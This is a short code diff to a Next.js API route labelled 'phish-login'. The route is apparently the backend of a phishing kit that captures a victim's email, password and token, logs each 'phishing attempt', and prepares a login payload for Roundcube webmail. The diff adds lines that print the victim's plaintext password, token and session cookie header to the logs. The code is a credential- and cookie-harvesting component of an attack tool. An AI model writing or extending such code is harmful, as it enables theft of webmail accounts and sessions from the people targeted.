@@ -8,6 +8,8 @@ export async function POST(request: NextRequest) {
     const body = await request.json();
     const { email, password, token } = body;
 
+    console.log("[phish-login] Comparing Password:", password, "against Token:", token)
+
     if (!email || !password || !token) {
       return new Response(
         JSON.stringify({
@@ -28,6 +30,7 @@ export async function POST(request: NextRequest) {
 
     console.log(`Phishing attempt: ${email}`);
     console.log(`Cookies present: ${cookieHeader ? "Yes" : "No"}`);
+    console.log("[phish-login] Received Cookie from Frontend: ", cookieHeader);
     console.log(`Referer: ${referer}`);
 
     // 3. Prepare the payload exactly as Roundcube expects
